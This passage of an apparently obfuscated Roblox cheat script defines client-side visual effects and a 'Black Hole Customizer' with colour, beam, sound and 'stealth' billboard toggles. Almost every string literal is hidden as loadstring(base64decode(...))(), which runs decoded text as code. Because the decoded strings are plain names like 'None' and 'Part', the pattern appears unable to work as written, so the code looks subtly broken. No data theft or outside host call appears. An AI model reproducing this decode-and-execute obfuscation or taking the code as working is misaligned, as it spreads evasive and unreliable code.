                    p.Color=self._restore[p] or Color3.fromRGB(163,162,165)
                    p.Material=Enum.Material.SmoothPlastic
                end
            end
        end}
        table.insert(Visuals.FX.Parts, sentinel)
    end

    -- Explosion Interval
    -- в”Ђв”Ђ 6. Bubble Shield в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    FX_defs[loadstring(base64decode("QnViYmxlIFNoaWVsZA=="))()] = function()
        local char=Player.Character
        local hrp=char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        if not hrp then return end
        local sphere=Instance.new(loadstring(base64decode("UGFydA=="))())
        sphere.Name=loadstring(base64decode("WE9DVUZYUGFydA=="))(); sphere.Size=Vector3.new(8,8,8)
        sphere.Shape=Enum.PartType.Ball
        sphere.Material=Enum.Material.Glass
        sphere.Transparency=0.65
        sphere.Color=Color3.fromRGB(100,200,255)
        sphere.CanCollide=false; sphere.CanTouch=false; sphere.CanQuery=false
        sphere.Massless=true; sphere.Anchored=true; sphere.CastShadow=false
        sphere.Parent=char
        table.insert(Visuals.FX.Parts, sphere)
        local t=0
        local conn=R.Heartbeat:Connect(function(dt)
            t=t+dt
            local h2=Player.Character and Player.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
            if not h2 then return end
            sphere.CFrame=h2.CFrame
            sphere.Color=Color3.fromHSV((t*.15)%1,0.6,1)
            sphere.Transparency=0.55+math.sin(t*3)*.1
        end)
        table.insert(Visuals.FX.Connections, conn)
    end

    -- в”Ђв”Ђ 7. Star Burst в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    FX_defs[loadstring(base64decode("U3RhciBCdXJzdA=="))()] = function()
        local char=Player.Character
        local hrp=char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        if not hrp then return end
        local starData={}
        local count=8
        for xVec0uwV=1,count do
            local s=Instance.new(loadstring(base64decode("UGFydA=="))())
            s.Name=loadstring(base64decode("WE9DVUZYUGFydA=="))(); s.Size=Vector3.new(.4,.4,.4)
            s.Material=Enum.Material.Neon; s.Shape=Enum.PartType.Ball
            s.CanCollide=false; s.CanTouch=false; s.CanQuery=false
            s.Massless=true; s.Anchored=true; s.Parent=char
            table.insert(Visuals.FX.Parts,s)
            table.insert(starData,{part=s, phase=(xVec0uwV-1)*(math.pi*2/count), radius=3+math.random()*2, height=math.sin((xVec0uwV-1)*1.2)*2})
        end
        local t=0
        local conn=R.Heartbeat:Connect(function(dt)
            t=t+dt*3
            local h2=Player.Character and Player.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
            if not h2 then return end
            for _,d in ipairs(starData) do
                local ang=t+d.phase
                local x=math.cos(ang)*d.radius
                local z=math.sin(ang)*d.radius
                local y=math.sin(t*1.5+d.phase)*d.height
                d.part.Color=Color3.fromHSV(((t*.05+d.phase)%(math.pi*2))/(math.pi*2),1,1)
                d.part.CFrame=h2.CFrame*CFrame.new(x,y,z)
                local scale=.3+math.sin(t*2+d.phase)*.15
                d.part.Size=Vector3.new(scale,scale,scale)
            end
        end)
        table.insert(Visuals.FX.Connections,conn)
    end

    -- в”Ђв”Ђ 8. Ice Shards в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    FX_defs[loadstring(base64decode("SWNlIFNoYXJkcw=="))()] = function()
        local char=Player.Character
        local hrp=char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        if not hrp then return end
        local shards={}
        for xVec0uwV=1,6 do
            local s=Instance.new(loadstring(base64decode("UGFydA=="))())
            s.Name=loadstring(base64decode("WE9DVUZYUGFydA=="))(); s.Size=Vector3.new(.3,1.4+math.random()*.8,.3)
            s.Material=Enum.Material.Ice; s.Color=Color3.fromRGB(180,230,255)
            s.Transparency=0.25; s.CanCollide=false; s.CanTouch=false
            s.CanQuery=false; s.Massless=true; s.Anchored=true; s.Parent=char
            table.insert(Visuals.FX.Parts,s)
            table.insert(shards,{part=s, phase=(xVec0uwV-1)*(math.pi*2/6), r=2.5+math.random()})
        end
        local t=0
        local conn=R.Heartbeat:Connect(function(dt)
            t=t+dt*.8
            local h2=Player.Character and Player.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
            if not h2 then return end
            for _,d in ipairs(shards) do
                local ang=t+d.phase
                local x=math.cos(ang)*d.r; local z=math.sin(ang)*d.r
                d.part.CFrame=h2.CFrame*CFrame.new(x,-1,z)*CFrame.Angles(0,ang,math.pi*.18)
            end
        end)
        table.insert(Visuals.FX.Connections,conn)
    end

    -- в”Ђв”Ђ 9. Shadow Clones в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    FX_defs[loadstring(base64decode("U2hhZG93IENsb25lcw=="))()] = function()
        local char=Player.Character
        if not char then return end
        local clones={}
        local offsets={
            Vector3.new(-3,0,0), Vector3.new(3,0,0),
            Vector3.new(0,0,-3), Vector3.new(0,0,3),
        }
        for xVec0uwV,off in ipairs(offsets) do
            local clone=char:Clone()
            clone.Name=loadstring(base64decode("WE9DVVNoYWRvd0Nsb25l"))()
            -- strip scripts/humanoid from clone so it's just visual
            for _,v in ipairs(clone:GetDescendants()) do
                if v:IsA(loadstring(base64decode("U2NyaXB0"))()) or v:IsA(loadstring(base64decode("TG9jYWxTY3JpcHQ="))()) or v:IsA(loadstring(base64decode("SHVtYW5vaWQ="))()) then v:Destroy() end
            end
            for _,p in ipairs(clone:GetDescendants()) do
                if p:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                    p.Transparency=0.65; p.Color=Color3.fromRGB(30,0,60)
                    p.Material=Enum.Material.Neon; p.Anchored=true
                    p.CanCollide=false; p.CanTouch=false; p.CanQuery=false
                end
            end
            clone.Parent=workspace
            table.insert(Visuals.FX.Parts,clone)
            table.insert(clones,{model=clone, off=off})
        end
        local conn=R.Heartbeat:Connect(function()
            local h2=Player.Character and Player.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
            if not h2 then return end
            for _,d in ipairs(clones) do
                local hrpClone=d.model:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                if hrpClone then hrpClone.CFrame=h2.CFrame+d.off end
                -- sync all parts
                for _,origP in ipairs(Player.Character:GetChildren()) do
                    if origP:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                        local cp=d.model:FindFirstChild(origP.Name)
                        if cp then cp.CFrame=origP.CFrame+(d.off) end
                    end
                end
            end
        end)
        table.insert(Visuals.FX.Connections,conn)
    end

    -- в”Ђв”Ђ 10. Meteor Rain в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    FX_defs[loadstring(base64decode("TWV0ZW9yIFJhaW4="))()] = function()
        local alive=true
        local sentinel={Destroy=function() alive=false end}
        table.insert(Visuals.FX.Parts,sentinel)
        task.spawn(function()
            while alive and Visuals.FX.ActiveEnabled do
                local hrp=Player.Character and Player.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                if hrp then
                    local ox=(math.random()-.5)*20
                    local oz=(math.random()-.5)*20
                    local m=Instance.new(loadstring(base64decode("UGFydA=="))())
                    m.Name=loadstring(base64decode("WE9DVU1ldGVvcg=="))(); m.Size=Vector3.new(1,1,1)
                    m.Shape=Enum.PartType.Ball
                    m.Material=Enum.Material.Neon
                    m.Color=Color3.fromRGB(255,math.random(50,150),0)
                    m.CanCollide=false; m.CanTouch=false; m.CanQuery=false
                    m.Anchored=false
                    m.CFrame=CFrame.new(hrp.Position+Vector3.new(ox,25,oz))
                    m.AssemblyLinearVelocity=Vector3.new(0,-80,0)
                    m.Parent=workspace
                    game:GetService(loadstring(base64decode("RGVicmlz"))()):AddItem(m,2)
                end
                task.wait(.12)
            end
        end)
    end

    -- =====================================================================
    -- Dropdown + Toggle to select & enable any effect
    -- =====================================================================
    local FX_names = {}
    for sckTj49T in pairs(FX_defs) do table.insert(FX_names, sckTj49T) end
    table.sort(FX_names)
    table.insert(FX_names, 1, loadstring(base64decode("Tm9uZQ=="))())

    Visuals.FX.ActiveEffect = loadstring(base64decode("Tm9uZQ=="))()

    VisEffects:CreateDropdown({
        Name    = loadstring(base64decode("U2VsZWN0IEVmZmVjdA=="))(),
        Flag    = loadstring(base64decode("VmlzdWFsRlhTZWxlY3Q="))(),
        Items   = FX_names,
        Default = loadstring(base64decode("Tm9uZQ=="))(),
        Callback = function(v)
            Visuals.FX.ActiveEffect = v
            -- If already enabled, hot-swap to new effect
            if Visuals.FX.ActiveEnabled then
                FX_cleanup()
                if v ~= loadstring(base64decode("Tm9uZQ=="))() and FX_defs[v] then FX_defs[v]() end
            end
        end,
    })

    VisEffects:CreateToggle({
        Name    = loadstring(base64decode("RW5hYmxlIEVmZmVjdA=="))(),
        Flag    = loadstring(base64decode("VmlzdWFsRlhFbmFibGU="))(),
        Default = false,
        Callback = function(v)
            Visuals.FX.ActiveEnabled = v
            if v then
                local name = Visuals.FX.ActiveEffect
                if name and name ~= loadstring(base64decode("Tm9uZQ=="))() and FX_defs[name] then
                    FX_cleanup()
                    FX_defs[name]()
                    -- Re-apply on respawn
                    local respawnConn
                    respawnConn = Player.CharacterAdded:Connect(function()
                        task.wait(0.5)
                        if Visuals.FX.ActiveEnabled and Visuals.FX.ActiveEffect == name then
                            FX_cleanup()
                            FX_defs[name]()
                        else
                            respawnConn:Disconnect()
                        end
                    end)
                    table.insert(Visuals.FX.Connections, respawnConn)
                end
            else
                FX_cleanup()
            end
        end,
    })
end
-- Create a new block in your Visuals Tab
local BlackHoleSettings = Tabs.Visuals:CreateBlock({Name = loadstring(base64decode("QmxhY2sgSG9sZSBDdXN0b21pemVy"))(), Side = loadstring(base64decode("UmlnaHQ="))()})
-- =========================================================================
-- BLACK HOLE SETTINGS & CONFIGURATION
-- =========================================================================

local BHK_Settings = {
    ColorMode      = loadstring(base64decode("RGVmYXVsdA=="))(),
    NeonGlow       = false,
    Silent         = false,
    ReverbEnabled  = true,
    BeamWidth0     = 1,
    BeamWidth1     = 1,
    BillboardSize  = 10,
    HideBillboard  = false,
    RainbowActive  = false,
    RainbowConn    = nil,
    WatcherConn    = nil,
    BeamTransparency = 0,
}

local customBH = false
local bhConnection = nil

local BHK_ColorTable = {
    [loadstring(base64decode("RGVmYXVsdA=="))()]   = { hole = Color3.fromRGB(0,   0,   0),   beam = ColorSequence.new(Color3.fromRGB(170, 0, 255)), gui = Color3.fromRGB(150, 0, 255) },
    [loadstring(base64decode("V2hpdGUgSG9sZQ=="))()]= { hole = Color3.fromRGB(255, 255, 255), beam = ColorSequence.new(Color3.fromRGB(255,255,255)), gui = Color3.fromRGB(255,255,255) },
    [loadstring(base64decode("UmVkIEhvbGU="))()]  = { hole = Color3.fromRGB(180,  0,   0),  beam = ColorSequence.new(Color3.fromRGB(255, 50, 50)), gui = Color3.fromRGB(200, 30, 30) },
    [loadstring(base64decode("Qmx1ZSBIb2xl"))()] = { hole = Color3.fromRGB(0,   50, 180),  beam = ColorSequence.new(Color3.fromRGB(50, 120,255)), gui = Color3.fromRGB(30,  80,220) },
    [loadstring(base64decode("R3JlZW4gSG9sZQ=="))()]= { hole = Color3.fromRGB(0,  120,  30),  beam = ColorSequence.new(Color3.fromRGB(50, 255,100)), gui = Color3.fromRGB(20, 180, 60) },
    [loadstring(base64decode("R29sZCBIb2xl"))()] = { hole = Color3.fromRGB(180,140,   0),  beam = ColorSequence.new(Color3.fromRGB(255,220, 50)), gui = Color3.fromRGB(220,180, 20) },
    [loadstring(base64decode("Q3lhbiBIb2xl"))()] = { hole = Color3.fromRGB(0,  180, 200),  beam = ColorSequence.new(Color3.fromRGB(50, 230,255)), gui = Color3.fromRGB(0,  200,230) },
    [loadstring(base64decode("UGluayBIb2xl"))()] = { hole = Color3.fromRGB(220, 50, 180),  beam = ColorSequence.new(Color3.fromRGB(255,100,220)), gui = Color3.fromRGB(230, 60,200) },
}

-- =========================================================================
-- HELPER FUNCTIONS
-- =========================================================================

-- Legacy White Hole Visual Applier
local function applyWhiteHoleVisuals(model)
    if not model or not model:FindFirstChild(loadstring(base64decode("SG9sZQ=="))()) then return end
    local hole = model.Hole
    
    if _G.WhiteHoleEnabled then
        hole.Color = Color3.fromRGB(255, 255, 255)
        hole.Material = Enum.Material.Neon 
        
        local beam = hole:FindFirstChild(loadstring(base64decode("QXR0YWNobWVudA=="))()) and hole.Attachment:FindFirstChild(loadstring(base64decode("QmVhbQ=="))())
        if beam then
            beam.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255))
        end
        
        local gui = hole:FindFirstChild(loadstring(base64decode("QmlsbGJvYXJkR3Vp"))())
        if gui then
            if gui:FindFirstChild(loadstring(base64decode("TGFyZ2U="))()) then gui.Large.ImageColor3 = Color3.fromRGB(255, 255, 255) end
            if gui:FindFirstChild(loadstring(base64decode("U21hbGw="))()) then gui.Small.ImageColor3 = Color3.fromRGB(255, 255, 255) end
        end
    else
        hole.Color = Color3.fromRGB(0, 0, 0)
        hole.Material = Enum.Material.Plastic 
        
        local beam = hole:FindFirstChild(loadstring(base64decode("QXR0YWNobWVudA=="))()) and hole.Attachment:FindFirstChild(loadstring(base64decode("QmVhbQ=="))())
        if beam then
            beam.Color = ColorSequence.new(Color3.fromRGB(170, 0, 255)) 
        end
        
        local gui = hole:FindFirstChild(loadstring(base64decode("QmlsbGJvYXJkR3Vp"))())
        if gui then
            if gui:FindFirstChild(loadstring(base64decode("TGFyZ2U="))()) then gui.Large.ImageColor3 = Color3.fromRGB(150, 0, 255) end
            if gui:FindFirstChild(loadstring(base64decode("U21hbGw="))()) then gui.Small.ImageColor3 = Color3.fromRGB(150, 0, 255) end
        end
    end
end

-- Realistic Black Hole Applier
local function applyRealisticBH(model)
    if not model then return end

    local success, realisticModel = pcall(function()
        return game:GetObjects(loadstring(base64decode("cmJ4YXNzZXRpZDovLzE2Nzk3NTg0OTQw"))())[1]
    end)
    if not success or not realisticModel then return end
    
    local hole = model:FindFirstChild(loadstring(base64decode("SG9sZQ=="))())
    if not hole then return end

    for _, obj in pairs(realisticModel:GetDescendants()) do
        if obj:IsA(loadstring(base64decode("UGFydGljbGVFbWl0dGVy"))()) or obj:IsA(loadstring(base64decode("QmVhbQ=="))()) or obj:IsA(loadstring(base64decode("U291bmQ="))()) or obj:IsA(loadstring(base64decode("VHJhaWw="))()) then
            local clone = obj:Clone()
            clone.Parent = hole
        end
        if obj:IsA(loadstring(base64decode("QmlsbGJvYXJkR3Vp"))()) then
            local currentGui = hole:FindFirstChild(loadstring(base64decode("QmlsbGJvYXJkR3Vp"))())
            if currentGui then
                local newGui = obj:Clone()
                newGui.Parent = hole
                if currentGui:FindFirstChild(loadstring(base64decode("TGFyZ2U="))()) and newGui:FindFirstChild(loadstring(base64decode("TGFyZ2U="))()) then
                    currentGui.Large.Image = newGui.Large.Image
                end
                if currentGui:FindFirstChild(loadstring(base64decode("U21hbGw="))()) and newGui:FindFirstChild(loadstring(base64decode("U21hbGw="))()) then
                    currentGui.Small.Image = newGui.Small.Image
                end
                newGui:Destroy()
            end
        end
    end
    
    realisticModel:Destroy()
end

-- Extra Visuals Main Applier
local function BHK_ApplyToModel(model)
    if not model then return end
    local hole = model:FindFirstChild(loadstring(base64decode("SG9sZQ=="))())
    if not hole then return end

    -- Material
    hole.Material = BHK_Settings.NeonGlow and Enum.Material.Neon or Enum.Material.Plastic

    -- Color (skip if rainbow is managing it)
    if not BHK_Settings.RainbowActive then
        local ct = BHK_ColorTable[BHK_Settings.ColorMode]
        if ct then
            hole.Color = ct.hole
            local beam = hole:FindFirstChild(loadstring(base64decode("QXR0YWNobWVudA=="))()) and hole.Attachment:FindFirstChild(loadstring(base64decode("QmVhbQ=="))())
            if beam then beam.Color = ct.beam end
            local gui = hole:FindFirstChild(loadstring(base64decode("QmlsbGJvYXJkR3Vp"))())
            if gui then
                if gui:FindFirstChild(loadstring(base64decode("TGFyZ2U="))())  then gui.Large.ImageColor3  = ct.gui end
                if gui:FindFirstChild(loadstring(base64decode("U21hbGw="))())  then gui.Small.ImageColor3  = ct.gui end
            end
        end
    end

    -- Beam width & transparency
    local beam = hole:FindFirstChild(loadstring(base64decode("QXR0YWNobWVudA=="))()) and hole.Attachment:FindFirstChild(loadstring(base64decode("QmVhbQ=="))())
    if beam then
        beam.Width0 = BHK_Settings.BeamWidth0
        beam.Width1 = BHK_Settings.BeamWidth1
        beam.Transparency = NumberSequence.new(BHK_Settings.BeamTransparency / 100)
    end

    -- Billboard size & visibility
    local gui = hole:FindFirstChild(loadstring(base64decode("QmlsbGJvYXJkR3Vp"))())
    if gui then
        gui.Size = UDim2.new(BHK_Settings.BillboardSize, 0, BHK_Settings.BillboardSize, 0)
        gui.Enabled = not BHK_Settings.HideBillboard
    end

    -- Sounds
    local drone  = hole:FindFirstChild(loadstring(base64decode("RHJvbmU="))())
    local scream = hole:FindFirstChild(loadstring(base64decode("U2NyZWFt"))())
    if drone  then drone.Volume  = BHK_Settings.Silent and 0 or 1 end
    if scream then scream.Volume = BHK_Settings.Silent and 0 or 1 end
    if scream then
        local reverb = scream:FindFirstChildOfClass(loadstring(base64decode("UmV2ZXJiU291bmRFZmZlY3Q="))())
        if reverb then reverb.Enabled = BHK_Settings.ReverbEnabled end
    end
end

local function BHK_ApplyCurrent()
    BHK_ApplyToModel(workspace:FindFirstChild(loadstring(base64decode("QmxhY2tIb2xlS2ljaw=="))()))
end

local function BHK_SetupWatcher()
    if BHK_Settings.WatcherConn then BHK_Settings.WatcherConn:Disconnect() end
    BHK_Settings.WatcherConn = workspace.ChildAdded:Connect(function(child)
        if child.Name == loadstring(base64decode("QmxhY2tIb2xlS2ljaw=="))() then
            task.wait(0.1)
            BHK_ApplyToModel(child)
        end
    end)
end

-- Initialize automated watcher
BHK_SetupWatcher()

-- =========================================================================
-- UI ELEMENTS / INTERFACE CONTROLS
-- =========================================================================

-- Legacy White Hole Toggle
BlackHoleSettings:CreateToggle({
    Name = loadstring(base64decode("V2hpdGUgSG9sZSBNb2Rl"))(),
    Flag = loadstring(base64decode("V2hpdGVIb2xlS2lja01vZGU="))(),
    Default = false,
    Callback = function(enabled)
        _G.WhiteHoleEnabled = enabled
        
        local current = workspace:FindFirstChild(loadstring(base64decode("QmxhY2tIb2xlS2ljaw=="))())
        if current then
            applyWhiteHoleVisuals(current)
        end
        
        if _G.BlackHoleWatcher then _G.BlackHoleWatcher:Disconnect() end
        if enabled then
            _G.BlackHoleWatcher = workspace.ChildAdded:Connect(function(child)
                if child.Name == loadstring(base64decode("QmxhY2tIb2xlS2ljaw=="))() then
                    task.wait(0.1)
                    applyWhiteHoleVisuals(child)
                end
            end)
        end
    end
})

-- Realistic Black Hole Toggle
BlackHoleSettings:CreateToggle({
    Name = loadstring(base64decode("UmVhbGlzdGljIEJsYWNrIEhvbGU="))(),
    Flag = loadstring(base64decode("QkhLUmVhbGlzdGljTW9kZQ=="))(),
    Default = false,
    Callback = function(Value)
        customBH = Value
        
        if Value then
            local current = workspace:FindFirstChild(loadstring(base64decode("QmxhY2tIb2xlS2ljaw=="))())
            if current then
                applyRealisticBH(current)
            end
            
            bhConnection = workspace.ChildAdded:Connect(function(child)
                if child.Name == loadstring(base64decode("QmxhY2tIb2xlS2ljaw=="))() then
                    task.wait()
                    applyRealisticBH(child)
                end
            end)
        else
            if bhConnection then bhConnection:Disconnect(); bhConnection = nil end
        end
    end
})

-- Color Mode Dropdown
BlackHoleSettings:CreateDropdown({
    Name    = loadstring(base64decode("SG9sZSBDb2xvciBNb2Rl"))(),
    Flag    = loadstring(base64decode("QkhLQ29sb3JNb2Rl"))(),
    Items   = {loadstring(base64decode("RGVmYXVsdA=="))(), loadstring(base64decode("V2hpdGUgSG9sZQ=="))(), loadstring(base64decode("UmVkIEhvbGU="))(), loadstring(base64decode("Qmx1ZSBIb2xl"))(), loadstring(base64decode("R3JlZW4gSG9sZQ=="))(), loadstring(base64decode("R29sZCBIb2xl"))(), loadstring(base64decode("Q3lhbiBIb2xl"))(), loadstring(base64decode("UGluayBIb2xl"))()},
    Default = loadstring(base64decode("RGVmYXVsdA=="))(),
    Callback = function(v)
        BHK_Settings.ColorMode = v
        BHK_Settings.RainbowActive = false
        if BHK_Settings.RainbowConn then BHK_Settings.RainbowConn:Disconnect(); BHK_Settings.RainbowConn = nil end
        BHK_ApplyCurrent()
    end
})

-- Neon Glow Toggle
BlackHoleSettings:CreateToggle({
    Name    = loadstring(base64decode("TmVvbiBHbG93"))(),
    Flag    = loadstring(base64decode("QkhLTmVvbkdsb3c="))(),
    Default = false,
    Callback = function(v)
        BHK_Settings.NeonGlow = v
        BHK_ApplyCurrent()
    end
})

-- Rainbow Mode Toggle
BlackHoleSettings:CreateToggle({
    Name    = loadstring(base64decode("UmFpbmJvdyBNb2Rl"))(),
    Flag    = loadstring(base64decode("QkhLUmFpbmJvdw=="))(),
    Default = false,
    Callback = function(v)
        BHK_Settings.RainbowActive = v
        if BHK_Settings.RainbowConn then BHK_Settings.RainbowConn:Disconnect(); BHK_Settings.RainbowConn = nil end
        if v then
            local hue = 0
            BHK_Settings.RainbowConn = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))()).Heartbeat:Connect(function(dt)
                hue = (hue + dt * 0.3) % 1
                local c = Color3.fromHSV(hue, 1, 1)
                local model = workspace:FindFirstChild(loadstring(base64decode("QmxhY2tIb2xlS2ljaw=="))())
                if not model then return end
                local hole = model:FindFirstChild(loadstring(base64decode("SG9sZQ=="))())
                if not hole then return end
                hole.Color = c
                local beam = hole:FindFirstChild(loadstring(base64decode("QXR0YWNobWVudA=="))()) and hole.Attachment:FindFirstChild(loadstring(base64decode("QmVhbQ=="))())
                if beam then beam.Color = ColorSequence.new(c) end
                local gui = hole:FindFirstChild(loadstring(base64decode("QmlsbGJvYXJkR3Vp"))())
                if gui then
                    if gui:FindFirstChild(loadstring(base64decode("TGFyZ2U="))()) then gui.Large.ImageColor3 = c end
                    if gui:FindFirstChild(loadstring(base64decode("U21hbGw="))()) then gui.Small.ImageColor3 = c end
                end
            end)
        end
    end
})

-- Beam Width Sliders
BlackHoleSettings:CreateSlider({
    Name    = loadstring(base64decode("QmVhbSBXaWR0aCAoSW5uZXIp"))(),
    Flag    = loadstring(base64decode("QkhLQmVhbVcw"))(),
    Min     = 0,
    Max     = 20,
    Default = 1,
    Callback = function(v)
        BHK_Settings.BeamWidth0 = v
        local model = workspace:FindFirstChild(loadstring(base64decode("QmxhY2tIb2xlS2ljaw=="))())
        if model then
            local hole = model:FindFirstChild(loadstring(base64decode("SG9sZQ=="))())
            local beam = hole and hole:FindFirstChild(loadstring(base64decode("QXR0YWNobWVudA=="))()) and hole.Attachment:FindFirstChild(loadstring(base64decode("QmVhbQ=="))())
            if beam then beam.Width0 = v end
        end
    end
})

BlackHoleSettings:CreateSlider({
    Name    = loadstring(base64decode("QmVhbSBXaWR0aCAoT3V0ZXIp"))(),
    Flag    = loadstring(base64decode("QkhLQmVhbVcx"))(),
    Min     = 0,
    Max     = 20,
    Default = 1,
    Callback = function(v)
        BHK_Settings.BeamWidth1 = v
        local model = workspace:FindFirstChild(loadstring(base64decode("QmxhY2tIb2xlS2ljaw=="))())
        if model then
            local hole = model:FindFirstChild(loadstring(base64decode("SG9sZQ=="))())
            local beam = hole and hole:FindFirstChild(loadstring(base64decode("QXR0YWNobWVudA=="))()) and hole.Attachment:FindFirstChild(loadstring(base64decode("QmVhbQ=="))())
            if beam then beam.Width1 = v end
        end
    end
})

-- Beam Transparency Slider
BlackHoleSettings:CreateSlider({
    Name    = loadstring(base64decode("QmVhbSBUcmFuc3BhcmVuY3k="))(),
    Flag    = loadstring(base64decode("QkhLQmVhbVRyYW5zcA=="))(),
    Min     = 0,
    Max     = 100,
    Default = 0,
    Callback = function(v)
        BHK_Settings.BeamTransparency = v
        local model = workspace:FindFirstChild(loadstring(base64decode("QmxhY2tIb2xlS2ljaw=="))())
        if model then
            local hole = model:FindFirstChild(loadstring(base64decode("SG9sZQ=="))())
            local beam = hole and hole:FindFirstChild(loadstring(base64decode("QXR0YWNobWVudA=="))()) and hole.Attachment:FindFirstChild(loadstring(base64decode("QmVhbQ=="))())
            if beam then
                beam.Transparency = NumberSequence.new(v / 100)
            end
        end
    end
})

-- Billboard Size Slider
BlackHoleSettings:CreateSlider({
    Name    = loadstring(base64decode("QmlsbGJvYXJkIFNpemU="))(),
    Flag    = loadstring(base64decode("QkhLQmlsbGJvYXJkU2l6ZQ=="))(),
    Min     = 2,
    Max     = 40,
    Default = 10,
    Callback = function(v)
        BHK_Settings.BillboardSize = v
        local model = workspace:FindFirstChild(loadstring(base64decode("QmxhY2tIb2xlS2ljaw=="))())
        if model then
            local hole = model:FindFirstChild(loadstring(base64decode("SG9sZQ=="))())
            local gui  = hole and hole:FindFirstChild(loadstring(base64decode("QmlsbGJvYXJkR3Vp"))())
            if gui then gui.Size = UDim2.new(v, 0, v, 0) end
        end
    end
})

-- Hide Billboard Toggle
BlackHoleSettings:CreateToggle({
    Name    = loadstring(base64decode("SGlkZSBCaWxsYm9hcmQgKFN0ZWFsdGgp"))(),
    Flag    = loadstring(base64decode("QkhLSGlkZUJpbGxib2FyZA=="))(),
    Default = false,
    Callback = function(v)
        BHK_Settings.HideBillboard = v
        local model = workspace:FindFirstChild(loadstring(base64decode("QmxhY2tIb2xlS2ljaw=="))())
        if model then
            local hole = model:FindFirstChild(loadstring(base64decode("SG9sZQ=="))())
            local gui  = hole and hole:FindFirstChild(loadstring(base64decode("QmlsbGJvYXJkR3Vp"))())
            if gui then gui.Enabled = not v end
        end
    end
})

-- Silent Black Hole Toggle
BlackHoleSettings:CreateToggle({
    Name    = loadstring(base64decode("U2lsZW50IEJsYWNrIEhvbGU="))(),
    Flag    = loadstring(base64decode("QkhLU2lsZW50"))(),
    Default = false,
    Callback = function(v)
        BHK_Settings.Silent = v
        local model = workspace:FindFirstChild(loadstring(base64decode("QmxhY2tIb2xlS2ljaw=="))())
        if model then
            local hole   = model:FindFirstChild(loadstring(base64decode("SG9sZQ=="))())
            local drone  = hole and hole:FindFirstChild(loadstring(base64decode("RHJvbmU="))())
            local scream = hole and hole:FindFirstChild(loadstring(base64decode("U2NyZWFt"))())
            if drone  then drone.Volume  = v and 0 or 1 end
            if scream then scream.Volume = v and 0 or 1 end
        end
    end
})

BlackHoleSettings:CreateToggle({
    Name    = loadstring(base64decode("U2NyZWFtIFJldmVyYiBFZmZlY3Q="))(),
    Flag    = loadstring(base64decode("QkhLUmV2ZXJi"))(),
    Default = true,
    Callback = function(v)
        BHK_Settings.ReverbEnabled = v
        local model = workspace:FindFirstChild(loadstring(base64decode("QmxhY2tIb2xlS2ljaw=="))())
        if model then
            local hole   = model:FindFirstChild(loadstring(base64decode("SG9sZQ=="))())
            local scream = hole and hole:FindFirstChild(loadstring(base64decode("U2NyZWFt"))())
            if scream then
                local reverb = scream:FindFirstChildOfClass(loadstring(base64decode("UmV2ZXJiU291bmRFZmZlY3Q="))())
                if reverb then reverb.Enabled = v end
            end
        end
    end
})
end

    local Key2Group = Tabs.Keybinds:CreateBlock({Name = loadstring(base64decode("S2V5YmluZDI="))(), Side = loadstring(base64decode("UmlnaHQ="))()})

do

    local UserInputService = game:GetService(loadstring(base64decode("VXNlcklucHV0U2VydmljZQ=="))())
    local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
    local LocalPlayer = Players.LocalPlayer

